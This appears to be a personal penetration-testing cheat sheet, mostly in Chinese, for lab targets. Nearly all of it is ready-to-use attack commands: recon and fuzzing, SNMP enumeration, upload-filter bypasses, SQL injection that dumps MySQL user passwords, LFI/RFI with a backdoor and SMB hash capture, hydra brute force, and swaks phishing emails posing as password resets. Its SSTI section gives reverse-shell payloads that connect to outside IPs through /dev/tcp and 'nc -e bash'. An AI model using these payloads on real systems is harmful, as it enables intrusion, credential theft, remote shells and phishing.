# Web

## Recon UDP Scan
nmap -sU -p- --min-rate 5000 $IP

## Recon TCP Scan
rustscan -a $IP -- -sC -sV --oN scan_results.txt

## 基础信息搜集
whatweb http://$IP:$PORT

## 网页模糊测试:

### Get:

#### ffuf 
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://$IP:8080/FUZZ

#### wfuzz
wfuzz -Z -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404 http://$IP:8080/FUZZ

### Post:

#### ffuf:
ffuf -w wordlist.txt -X POST -d “username=admin\&password=FUZZ” -u http://website.com/FUZZ

#### Subdomain ffuf 注意加个-mc all 因为404也有可能是subdomain
ffuf -u http://10.10.11.193 -H "Host: FUZZ.mentorquotes.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 18 -mc all

## UDP扫描
### SNMP Enumeration
#### Community String字典扫描
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $IP
注意onesixtyone用的是v1的模式，对于v2模式的枚举可以使用snmpbrute.py
python3 ~/Documents/SNMP-Brute/snmpbrute.py -t $IP

#### extend-mib enumeration
snmpwalk -v 1 -c public $IP NET-SNMP-EXTEND-MIB::nsExtendObjects

#### HTB里碰到的扫描 使用bulkwalk因为是多线程所以会快很多
snmpbulkwalk -v2c -c internal $IP

#### 配置文件
cat /etc/snmp/snmpd.conf

### TFTP
UPD port 69
使用如下命令连接
tftp $IP

### Git:
如果网页有.git目录，尝试git-dumper所有文件
然后查找凭证 git log, git show, git status等操作
git status找到后可以用git diff --cached filename 来查看文件内容


## 文件上传相关

### 测试能否上传至任意目录
../../../test.txt
r/../../../../test.txt

### 文件拓展名bypass:

PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc  
ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml  
Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action  
Coldfusion: .cfm, .cfml, .cfc, .dbm  
Flash: .swf  
Perl: .pl, .cgi  
Erlang Yaws Web Server: .yaws  

如果无法bypass，试试magic bytes  
比如PNG的话magic bytes的显示应该是png  
参考wiki https://en.wikipedia.org/wiki/List_of_file_signatures  
GIF的话是  GIF89a;  

### 试着上传特定环境下的config文件  
Apache: .htaccess  
内容可以添加  
AddType application/x-httpd-php .jpg  

IIS: web.config  
IIS的 情况应该是xml文件执行代码  

## SQL Injection
### 登录bypass 
Username=test' OR 1=1; -- // 

### mysql time-based injection
Test' OR sleep(5) -- // 
 
### Mysql 显示注入
如果注入包含内容显示，可以通过以下命令去寻找内容，需要注意type需要对齐,例如str对应str, int 对应int
1. 先找出所有databse名称
UNION SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schemata;-- // 
2. 列出某个特定的database里存在的table
UNION SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema='hotel' ;-- // 
3. 列出table里的列内容
UNION SELECT 1, group_concat(column_name), 3, 4, 5, 6, 7 from information_schema.columns where table_name='room';-- // 
4. 列出列的内容
UNION SELECT 1, star, mini, 4, 5, 6, 7 from hotel.room; -- // 

或者是寻找mysql表格内的内容
```
UNION SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema='mysql' ;-- //
UNION SELECT 1, group_concat(column_name), 3, 4, 5, 6, 7 from information_schema.columns where table_name='user';-- // 
SELECT 1, user,3, 4,password, 6, 7 from mysql.user;-- // 
```

## 403 bypass
可以尝试的header
· X-Originating-IP: 127.0.0.1
· X-Forwarded-For: 127.0.0.1
· X-Forwarded: 127.0.0.1
· Forwarded-For: 127.0.0.1
· X-Remote-IP: 127.0.0.1
· X-Remote-Addr: 127.0.0.1
· X-ProxyUser-Ip: 127.0.0.1
· X-Original-URL: 127.0.0.1
· Client-IP: 127.0.0.1
· True-Client-IP: 127.0.0.1
· Cluster-Client-IP: 127.0.0.1
· X-ProxyUser-Ip: 127.0.0.1
· Host: localhost



## Brute Force
如果弱口令没有办法登录，尝试看看有没有什么特别的用户信息，然后用cupp去生成一个用户可能的密码试试
https://github.com/Mebus/cupp


## SSRF
如果有URL可以输入且get了文件，但是跑的是php以外的架构的话，考虑本地服务嗅探
http://127.0.01:$PORT

ffuf -u http://editorial.htb/upload-cover -request request2.txt -w <( seq 0 65535) -ac

## LFI
可以试试读取信息
GET /meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../var/www/html/backup.php
或者是（如果路径遍历无效，说明有可能是绝对路径)
/index.php?lang=/etc/passwd
以及 /proc/self/cmdline
如果还想要读取一些系统代码的信息，可以试试system下的文件, 这里可能会存一些东西
/etc/systemd/system/aria2.service

也可以查看php.ini
GET news.php?file=../../../../../../../etc/php/7.4/apache2/php.ini
如果版本不对的话可以通过ffuf 来爆破版本
ffuf -w <(seq 0 10):FUZZ1 -w <(seq 0 10):FUZZ2  -u http://megahosting.htb/news.php?file=../../../../../../../etc/php/FUZZ1.FUZZ2/apache2/php.ini -ac

或者是/proc/self/cmdline相关的/proc/FUZZ/cmdline
ffuf -w <(seq 0 65535) -u http://megahosting.htb/news.php?file=../../../../../../../proc/FUZZ/cmdline -ac 

如果碰到文件没有显示的话，view page source或者是放到burp suite里加载看看，也许不一定是没显示
另外碰到特定版本的话试试版本号+配置文件去搜索


## RFI
PHP架构的话可以试试 (http:// 或者ftp:// )
GET /meteor/index.php?page=http://$IP/backdoor.php&cmd=whoami

如果是windows的话，在不能通过Responder拿到哈希的情况下，说明用户可能是低权限账户在跑，那就试试
GET /meteor/index.php?page=\\$IP\share\backdoor.php&cmd=whoami
impacket-smbserver share ./ -smb2support

如果没有办法RFI，可以试试抓哈希
GET /meteor/index.php?page=\\$IP\share\test.php
GET /meteor/index.php?page=//$IP/share/test.php

## SMTP 
用户枚举
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t $IP
密码爆破
hydra -L smtp_users.txt -P dict.txt -s 143 -e ns -t 16 imap://$IP

## 钓鱼邮件交互
swaks --from it@postfish.off --to brian.moore@postfish.off --server $IP  --body @emailbody.txt --header "Subject: postfish.off Password Reset Link"
如果需要认证的话
swaks --from maildmz@relia.com --to jim@relia.com --server 192.168.174.189:587 --auth LOGIN --body @emailbody.txt --header "Subject: automatic_configuration Script" --attach @config.library-ms --suppress-data -ap
人工交互的话使用telnet $IP 110 或者是 telnet $IP 25来进行交互，可能需要等待一段时间来响应
此外，如果有SMTP的管理服务的话，例如JAMES pop3d 2.3.2
可以通过 nc $IP 4555来进行交互
通过修改密码来获得25或者110端口的账户访问权限
POP commands:
  USER uid           Log in as "uid"
  PASS password      Substitue "password" for your actual password
  STAT               List number of messages, total mailbox size
  LIST               List messages and sizes
  RETR n             Show message n
  DELE n             Mark message n for deletion
  RSET               Undo any changes
  QUIT               Logout (expunges messages if no RSET)
  TOP msg n          Show first n lines of message number msg
  CAPA               Get capabilities

```
root@kali:~# telnet $ip 110
 +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
 USER billydean    
 +OK
 PASS password
 +OK Welcome billydean

 list

 +OK 2 1807
 1 786
 2 1021

 retr 1

 +OK Message follows
 From: jamesbrown@motown.com
 Dear Billy Dean,

 Here is your login for remote desktop ... try not to forget it this time!
 username: billydean
 password: PA$$W0RD!Z
```


## 猜用户名
发现这个用户名生成工具非常好用 AD-Username-Generator
https://github.com/mohinparamasivam/AD-Username-Generator

python3 AD-Username-Generator/username-generate.py -u users.txt -o users_list.txt

## 猜密码
默认密码如果没头绪可以在kali的这个folder下面找找有没有存有的默认凭证
/usr/share/wordlist/seclist/Password

爆破的话
hydra -L usernames.txt -P passwords.txt $IP -s 8081 http-post-form '/service/rapture/session:username=^USER64^&password=^PASS64^:Forbidden'


## Mount Port 2049
查看mount端点
Showmount -e $IP 

┌──(kali㉿kali)-[/mnt]
└─$ showmount -e 192.168.1.161
Export list for 192.168.1.161:
/home/ll104567 *


## Java版本变更
sudo update-alternatives --config java

There are 2 choices for the alternative java (providing /usr/bin/java).

  Selection    Path                                         Priority   Status
------------------------------------------------------------
* 0            /usr/lib/jvm/java-21-openjdk-amd64/bin/java   2111      auto mode
  1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java   1111      manual mode
  2            /usr/lib/jvm/java-21-openjdk-amd64/bin/java   2111      manual mode



## SSTI
测试payload
{{7*7}}
ReverseShell
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/192.168.1.129/4141 0>&1"').read() }}
{{config.__class__.__init__.__globals__['os'].popen('busybox nc 192.168.45.194 5000 -e bash &').read()}}

{%%20if%20request[%27application%27][%27__globals__%27][%27__builtins__%27][%27__import__%27](%27os%27)[%27popen%27](%27busybox%20nc%20192.168.1.204%2080%20-e%20bash%27)[%27read%27]()%20==%20%27chiv%27%20%}%20a%20{%%20endif%20%}